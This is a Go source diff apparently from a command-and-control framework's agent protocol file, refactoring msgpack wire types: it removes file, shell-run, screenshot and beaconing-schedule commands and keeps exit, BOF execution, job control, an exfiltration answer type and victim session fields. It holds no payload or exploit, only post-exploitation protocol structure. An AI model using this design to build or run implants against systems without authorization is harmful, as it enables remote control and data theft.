@@ -21,28 +21,12 @@ func Unmarshal(data []byte, v interface{}) error {
 	return msgpack.Unmarshal(data, v)
 }
 
-// ─── Command codes ─────────────────────────────────────────────────────────────
+// ─── Command codes (shared with protocol overlays) ─────────────────────────────
+// Agent-side command constants (COMMAND_FS_*, COMMAND_OS_*, RESP_*, etc.) are
+// in agent_types.go which survives protocol overlay replacement.
 
 const (
-	COMMAND_EXIT    = 0
-	COMMAND_UNKNOWN = 1
-
-	COMMAND_FS_LIST     = 10
-	COMMAND_FS_UPLOAD   = 11
-	COMMAND_FS_DOWNLOAD = 12
-	COMMAND_FS_REMOVE   = 13
-	COMMAND_FS_MKDIRS   = 14
-	COMMAND_FS_COPY     = 15
-	COMMAND_FS_MOVE     = 16
-
-	COMMAND_OS_RUN        = 20
-	COMMAND_OS_INFO       = 21
-	COMMAND_OS_PS         = 22
-	COMMAND_OS_SCREENSHOT = 23
-
-	COMMAND_PROFILE_SLEEP    = 40
-	COMMAND_PROFILE_KILLDATE = 41
-	COMMAND_PROFILE_WORKTIME = 42
+	COMMAND_EXIT = 0
 
 	COMMAND_EXEC_BOF       = 50
 	COMMAND_EXEC_BOF_OUT   = 51
@@ -50,19 +34,6 @@ const (
 
 	COMMAND_JOB_LIST = 60
 	COMMAND_JOB_KILL = 61
-
-	RESP_COMPLETE      = 0
-	RESP_ERROR         = 1
-	RESP_FS_LIST       = 10
-	RESP_FS_UPLOAD     = 11
-	RESP_FS_DOWNLOAD   = 12
-	RESP_OS_RUN        = 20
-	RESP_OS_INFO       = 21
-	RESP_OS_PS         = 22
-	RESP_OS_SCREENSHOT = 23
-
-	EXFIL_PACK = 100
-	JOB_PACK   = 101
 )
 
 // ─── Wire types ────────────────────────────────────────────────────────────────
@@ -85,18 +56,17 @@ type Profile struct {
 }
 
 type SessionInfo struct {
-	Hostname    string `msgpack:"hostname"`
-	Username    string `msgpack:"username"`
-	Domain      string `msgpack:"domain"`
-	InternalIP  string `msgpack:"internal_ip"`
-	Os          string `msgpack:"os"`
-	OsVersion   string `msgpack:"os_version"`
-	OsArch      string `msgpack:"os_arch"`
-	Elevated    bool   `msgpack:"elevated"`
-	ProcessId   uint32 `msgpack:"process_id"`
-	ProcessName string `msgpack:"process_name"`
-	CodePage    uint32 `msgpack:"code_page"`
-	Sleep       string `msgpack:"sleep"`
+	Process    string `msgpack:"process"`
+	PID        int    `msgpack:"pid"`
+	User       string `msgpack:"user"`
+	Host       string `msgpack:"host"`
+	Ipaddr     string `msgpack:"ipaddr"`
+	Elevated   bool   `msgpack:"elevated"`
+	Acp        uint32 `msgpack:"acp"`
+	Oem        uint32 `msgpack:"oem"`
+	Os         string `msgpack:"os"`
+	OSVersion  string `msgpack:"os_version"`
+	EncryptKey []byte `msgpack:"encrypt_key"`
 }
 
 type Message struct {
@@ -110,135 +80,20 @@ type Command struct {
 	Data []byte `msgpack:"data"`
 }
 
-// ─── Request param types ───────────────────────────────────────────────────────
-
-type ParamsExit struct{}
-
-type ParamsFsList struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsUpload struct {
-	Path string `msgpack:"path"`
-	Data []byte `msgpack:"data"`
-}
-
-type ParamsFsDownload struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsRemove struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsMkdirs struct {
-	Path string `msgpack:"path"`
-}
-
-type ParamsFsCopy struct {
-	Src string `msgpack:"src"`
-	Dst string `msgpack:"dst"`
-}
-
-type ParamsFsMove struct {
-	Src string `msgpack:"src"`
-	Dst string `msgpack:"dst"`
-}
-
-type ParamsOsRun struct {
-	Command string `msgpack:"command"`
-	Output  bool   `msgpack:"output"`
-	Wait    bool   `msgpack:"wait"`
-}
-
-type ParamsOsInfo struct{}
-
-type ParamsOsPs struct{}
-
-type ParamsOsScreenshot struct{}
-
-type ParamsProfileSleep struct {
-	Sleep  int `msgpack:"sleep"`
-	Jitter int `msgpack:"jitter"`
-}
-
-type ParamsProfileKilldate struct {
-	KillDate int64 `msgpack:"kill_date"`
-}
-
-type ParamsProfileWorktime struct {
-	WorkStart int `msgpack:"work_start"`
-	WorkEnd   int `msgpack:"work_end"`
-}
-
-// ─── Response answer types ─────────────────────────────────────────────────────
+// ─── Error type (shared with protocol overlays) ───────────────────────────────
 
 type AnsError struct {
-	Message string `msgpack:"message"`
+	Error string `msgpack:"error"`
 }
 
-type AnsOsInfo struct {
-	Hostname    string `msgpack:"hostname"`
-	Username    string `msgpack:"username"`
-	Domain      string `msgpack:"domain"`
-	InternalIP  string `msgpack:"internal_ip"`
-	Os          string `msgpack:"os"`
-	OsVersion   string `msgpack:"os_version"`
-	OsArch      string `msgpack:"os_arch"`
-	Elevated    bool   `msgpack:"elevated"`
-	ProcessId   uint32 `msgpack:"process_id"`
-	ProcessName string `msgpack:"process_name"`
-	CodePage    uint32 `msgpack:"code_page"`
-}
-
-type DirEntry struct {
-	Name    string `msgpack:"name"`
-	IsDir   bool   `msgpack:"is_dir"`
-	Size    int64  `msgpack:"size"`
-	ModTime int64  `msgpack:"mod_time"`
-}
-
-type AnsFsList struct {
-	Path    string     `msgpack:"path"`
-	Entries []DirEntry `msgpack:"entries"`
-}
-
-type AnsFsUpload struct {
-	Path string `msgpack:"path"`
-}
-
-type AnsFsDownload struct {
-	Path string `msgpack:"path"`
-	Data []byte `msgpack:"data"`
-}
-
-type AnsOsRun struct {
-	Output string `msgpack:"output"`
-}
-
-type ProcessEntry struct {
-	Pid     uint32 `msgpack:"pid"`
-	PPid    uint32 `msgpack:"ppid"`
-	Name    string `msgpack:"name"`
-	User    string `msgpack:"user"`
-	Arch    string `msgpack:"arch"`
-	Session uint32 `msgpack:"session"`
-}
-
-type AnsOsPs struct {
-	Processes []ProcessEntry `msgpack:"processes"`
-}
-
-type AnsOsScreenshot struct {
-	Image []byte `msgpack:"image"`
-}
+// ─── Exfil type ────────────────────────────────────────────────────────────────
 
 type AnsExfil struct {
 	CommandId uint   `msgpack:"command_id"`
 	Data      []byte `msgpack:"data"`
 }
 
-// ─── BOF types ─────────────────────────────────────────────────────────────────
+// ─── BOF types (shared with protocol overlays) ─────────────────────────────────
 
 type ParamsExecBof struct {
 	Object   []byte `msgpack:"object"`
